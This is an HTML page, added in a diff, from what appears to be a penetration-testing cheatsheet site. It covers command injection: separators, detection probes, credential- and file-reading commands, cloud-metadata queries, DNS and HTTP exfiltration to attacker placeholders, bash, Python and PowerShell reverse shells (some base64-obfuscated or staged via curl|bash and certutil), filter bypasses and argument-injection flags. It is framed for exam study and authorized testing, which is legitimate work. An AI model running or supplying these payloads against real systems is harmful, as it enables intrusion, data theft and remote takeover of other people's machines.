@@ -1,0 +1,321 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cheatsheet · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Command Injection</nav><h1>Cheatsheet</h1><p class="cx-lede">Single-page command injection reference - separators, detection probes, execution one-liners, blind exfil, top filter bypasses, and argument injection.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059</span><span class="cx-tag">D3FEND D3-MH, D3-PSA</span><span class="cx-tag">IMPACT RCE</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="separators">Separators</h2>
+<table>
+<thead>
+<tr>
+<th>Sep</th>
+<th>URL-enc</th>
+<th>Both run?</th>
+<th>Output</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>;</code></td>
+<td><code>%3b</code></td>
+<td>Yes</td>
+<td>Both</td>
+<td>Fails on cmd.exe</td>
+</tr>
+<tr>
+<td><code>\n</code></td>
+<td><code>%0a</code></td>
+<td>Yes</td>
+<td>Both</td>
+<td>Most reliable; rarely filtered</td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td><code>%26</code></td>
+<td>Yes</td>
+<td>Both</td>
+<td>Background on Linux; sequential on Windows</td>
+</tr>
+<tr>
+<td><code>\|</code></td>
+<td><code>%7c</code></td>
+<td>Yes</td>
+<td>Injected only</td>
+<td></td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td><code>%26%26</code></td>
+<td>If first succeeds</td>
+<td>Both</td>
+<td></td>
+</tr>
+<tr>
+<td><code>\|\|</code></td>
+<td><code>%7c%7c</code></td>
+<td>If first fails</td>
+<td>Injected only</td>
+<td></td>
+</tr>
+<tr>
+<td><code>` `</code></td>
+<td><code>%60%60</code></td>
+<td>Substitution</td>
+<td>Linux/macOS only</td>
+<td></td>
+</tr>
+<tr>
+<td><code>$()</code></td>
+<td><code>%24%28%29</code></td>
+<td>Substitution</td>
+<td>Linux/macOS only</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="detection-probes">Detection probes</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;original&gt;;id
+&lt;original&gt;%0aid
+&lt;original&gt;|id
+&lt;original&gt;&amp;&amp;id
+&lt;original&gt;`id`
+&lt;original&gt;$(id)</code></pre></figure>
+<p>Success: <code>uid=</code> in response body, or response time delta if blind.</p>
+<h2 id="execution">Execution</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Identity &amp; environment
+id; whoami; hostname; uname -a; pwd; env
+
+# Files
+cat /etc/passwd
+cat /etc/shadow
+cat /var/www/html/.env
+cat ~/.ssh/id_rsa
+cat /proc/self/environ
+
+# Network &amp; privesc
+ip a; ss -tlnp 2&gt;/dev/null
+sudo -n -l
+find / -perm -4000 -type f 2&gt;/dev/null
+find / -writable -type d 2&gt;/dev/null
+
+# Cloud metadata
+curl -s --max-time 2 http://169.254.169.254/latest/meta-data/
+
+# Output capture patterns
+;id 2&gt;&amp;1                                # merge stderr
+;id &gt; /tmp/.r 2&gt;&amp;1; cat /tmp/.r         # write-then-read</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell"># Identity &amp; environment
+whoami /all; hostname; systeminfo; ipconfig /all
+Get-ChildItem env:
+
+# Files
+type C:\Users\admin\Desktop\flag.txt
+Get-Content C:\inetpub\wwwroot\web.config
+Get-Content C:\Windows\Panther\Unattend.xml
+
+# Privesc-adjacent
+cmdkey /list
+netsh wlan show profile
+Get-CimInstance Win32_Service | Select Name,PathName,StartName
+
+# Cloud metadata
+Invoke-RestMethod -Uri http://169.254.169.254/metadata/instance?api-version=2021-02-01 -Headers @{Metadata=&quot;true&quot;} -TimeoutSec 2</code></pre></figure>
+</div>
+</div>
+<h2 id="blind-oob">Blind &amp; OOB</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Time-based
+;sleep 10
+;ping -c 10 127.0.0.1
+
+# DNS exfil (Burp Collaborator / interactsh)
+;nslookup &lt;ATTACKER&gt;
+;nslookup $(whoami).&lt;ATTACKER&gt;
+;nslookup $(id|base64 -w0|tr -d &#x27;=&#x27;).&lt;ATTACKER&gt;
+
+# HTTP exfil
+;curl &lt;ATTACKER&gt;/$(whoami)
+;curl &lt;ATTACKER&gt;/$(id|base64 -w0)
+;curl -X POST &lt;ATTACKER&gt; -d &quot;$(cat /etc/passwd)&quot;
+
+# No curl/wget
+;exec 3&lt;&gt;/dev/tcp/&lt;ATTACKER&gt;/80; echo -e &quot;GET /$(whoami) HTTP/1.0\r\n\r\n&quot; &gt;&amp;3</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell"># Time-based
+;ping -n 11 127.0.0.1
+;Start-Sleep -s 10
+
+# DNS / HTTP exfil
+;nslookup &quot;$(whoami).&lt;ATTACKER&gt;&quot;
+;iwr &lt;ATTACKER&gt;/$(whoami)
+;Invoke-WebRequest &lt;ATTACKER&gt; -Method POST -Body (Get-Content C:\Windows\win.ini -Raw)
+
+# cmd.exe (no PowerShell)
+&amp;certutil -urlcache -split -f http://&lt;ATTACKER&gt;/x %TEMP%\x</code></pre></figure>
+</div>
+</div>
+<h2 id="reverse-shells">Reverse shells</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Listener
+nc -lvnp &lt;LPORT&gt;
+
+# bash TCP
+;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;
+
+# Filter-resistant (brace expansion + base64)
+;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88TEhPU1Q+LzxMUE9SVD4gMD4mMQ==}|{base64,-d}|{bash,-i}
+
+# python (no /dev/tcp)
+;python3 -c &#x27;import socket,os,pty;s=socket.socket();s.connect((&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;
+
+# Stage from your server
+;curl &lt;ATTACKER&gt;/r.sh|bash
+
+# TTY upgrade (after callback)
+python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;
+# Ctrl+Z, then locally: stty raw -echo; fg ; export TERM=xterm-256color</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell"># PowerShell reverse shell
+;powershell -nop -w hidden -c &quot;$c=New-Object Net.Sockets.TCPClient(&#x27;&lt;LHOST&gt;&#x27;,&lt;LPORT&gt;);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2&gt;&amp;1|Out-String);$r2=$r+&#x27;PS &#x27;+(pwd).Path+&#x27;&gt; &#x27;;$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()&quot;
+
+# Encoded (filter bypass)
+;powershell -nop -w hidden -enc &lt;BASE64-UTF16LE&gt;
+
+# Stage Nishang or ConPtyShell
+;IEX(IWR -UseBasicParsing http://&lt;ATTACKER&gt;/Invoke-ConPtyShell.ps1);Invoke-ConPtyShell &lt;LHOST&gt; &lt;LPORT&gt;
+
+# certutil drop-and-run (no PowerShell)
+&amp;certutil -urlcache -split -f http://&lt;ATTACKER&gt;/nc.exe %TEMP%\nc.exe&amp;%TEMP%\nc.exe -e cmd.exe &lt;LHOST&gt; &lt;LPORT&gt;</code></pre></figure>
+</div>
+</div>
+<h2 id="filter-bypasses">Filter bypasses</h2>
+<h3 id="spaces">Spaces</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">{cat,/etc/passwd}                       # brace expansion
+cat${IFS}/etc/passwd                    # IFS variable
+cat%09/etc/passwd                       # tab</code></pre></figure>
+<h3 id="slashes">Slashes</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">${PATH:0:1}                             # = &quot;/&quot;
+${HOME:0:1}                             # = &quot;/&quot;
+%HOMEPATH:~6,-11%                       # cmd: = &quot;\&quot;
+$env:HOMEPATH[0]                        # PowerShell: = &quot;\&quot;</code></pre></figure>
+<h3 id="command-names">Command names</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">w&#x27;h&#x27;o&#x27;am&#x27;i                              # quote insertion (Linux/Win)
+w&quot;h&quot;o&quot;am&quot;i
+who$@ami                                # positional param (Linux)
+w\h\o\am\i                              # backslash (Linux)
+who^ami                                 # caret (Windows cmd)
+$(rev&lt;&lt;&lt;imaohw)                         # reversal (Linux)
+$(tr &quot;[A-Z]&quot; &quot;[a-z]&quot;&lt;&lt;&lt;&quot;WhOaMi&quot;)        # case conversion</code></pre></figure>
+<h3 id="wholesale">Wholesale</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Linux base64 wrapper
+;bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;&lt;base64-payload&gt;)
+
+# Windows encoded command
+;powershell -nop -w hidden -enc &lt;BASE64-UTF16LE&gt;</code></pre></figure>
+<h3 id="stacked-example">Stacked example</h3>
+<p>Filtered: spaces, <code>;</code>, <code>cat</code>, <code>/</code>. Newline allowed.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%0a${LS_COLORS:10:1}c&#x27;a&#x27;t${IFS}${PATH:0:1}etc${PATH:0:1}passwd</code></pre></figure>
+<h2 id="argument-injection">Argument injection</h2>
+<table>
+<thead>
+<tr>
+<th>Binary</th>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>curl</code></td>
+<td><code>-o &lt;FILE&gt; &lt;URL&gt;</code></td>
+<td>Write file</td>
+</tr>
+<tr>
+<td><code>curl</code></td>
+<td><code>-K &lt;FILE&gt;</code></td>
+<td>Read file (config parser)</td>
+</tr>
+<tr>
+<td><code>curl</code></td>
+<td><code>--upload-file &lt;FILE&gt; &lt;URL&gt;</code></td>
+<td>Exfil file</td>
+</tr>
+<tr>
+<td><code>wget</code></td>
+<td><code>-O &lt;FILE&gt; &lt;URL&gt;</code></td>
+<td>Write file</td>
+</tr>
+<tr>
+<td><code>ssh</code></td>
+<td><code>-o ProxyCommand="&lt;CMD&gt;" anyhost</code></td>
+<td>RCE</td>
+</tr>
+<tr>
+<td><code>tar</code></td>
+<td><code>--checkpoint=1 --checkpoint-action=exec=&lt;CMD&gt;</code></td>
+<td>RCE</td>
+</tr>
+<tr>
+<td><code>find</code></td>
+<td><code>-exec &lt;CMD&gt; \;</code></td>
+<td>RCE</td>
+</tr>
+<tr>
+<td><code>git</code></td>
+<td><code>clone --upload-pack="&lt;CMD&gt;" 'ssh://x/x'</code></td>
+<td>RCE (CVE-2017-1000117 family)</td>
+</tr>
+<tr>
+<td><code>psql</code></td>
+<td><code>-c '\! &lt;CMD&gt;'</code></td>
+<td>RCE via shell escape</td>
+</tr>
+</tbody>
+</table>
+<p>Detect by sending value starting with <code>-</code> (e.g., <code>--help</code>, <code>--version</code>). Response change = argv reached.</p>
+<h2 id="encoding-helpers">Encoding helpers</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># base64 for Linux bash&lt;&lt;&lt; wrapper
+echo -n &#x27;&lt;command&gt;&#x27; | base64 -w0
+
+# base64 for PowerShell -enc (UTF-16LE!)
+echo -n &#x27;&lt;command&gt;&#x27; | iconv -t UTF-16LE | base64 -w0
+
+# URL encode in shell
+python3 -c &quot;import urllib.parse;print(urllib.parse.quote(&#x27;&lt;payload&gt;&#x27;))&quot;</code></pre></figure>
+<h2 id="oob-listeners">OOB listeners</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Burp Collaborator: built into Burp Pro
+# interactsh
+interactsh-client                       # public server, prints hostname
+
+# Self-hosted (your VPS)
+sudo tcpdump -i any -n udp port 53      # DNS
+python3 -m http.server 80               # HTTP
+nc -lvnp 80                             # raw HTTP</code></pre></figure>
+<h2 id="quick-decision-tree">Quick decision tree</h2>
+<ol>
+<li>Output reflected? → use <code>;</code> or <code>\n</code>, run <code>id</code></li>
+<li>Output suppressed? → use <code>;sleep 10</code> to confirm, then OOB via curl/nslookup</li>
+<li>"Invalid input" error? → reduce by one char to find filter, apply matching bypass</li>
+<li>Binary takes user value as arg without shell? → try <code>--help</code>, then exploit-flags table above</li>
+<li>Got RCE, need shell? → bash <code>/dev/tcp</code> or PowerShell TCPClient, base64-wrap if filtered</li>
+</ol>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>Bookmark this page during exams. Every other page in this section drills deeper; this one is the lookup table for when you've already done the analysis and need the payload.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../argument-injection/index.html">Previous: Argument injection</a><a class="cx-next" href="../defense/index.html">Next: Defending Against Command Injection</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
